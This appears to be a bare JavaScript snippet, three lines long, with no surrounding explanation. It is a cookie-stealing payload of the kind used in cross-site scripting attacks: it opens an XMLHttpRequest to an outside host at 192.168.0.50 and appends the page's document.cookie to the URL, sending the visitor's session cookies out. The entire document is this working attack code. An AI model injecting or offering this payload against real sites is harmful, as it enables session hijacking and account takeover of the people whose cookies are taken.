var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.0.50/?cookie=' + document.cookie);
request.send();
